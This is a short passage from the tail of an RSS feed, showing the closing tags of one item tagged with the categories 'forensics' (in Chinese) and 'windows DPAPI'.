        <category>取证</category>
        
        <category>windows DPAPI</category>
        
      </item>
    
  </channel>
</rss>
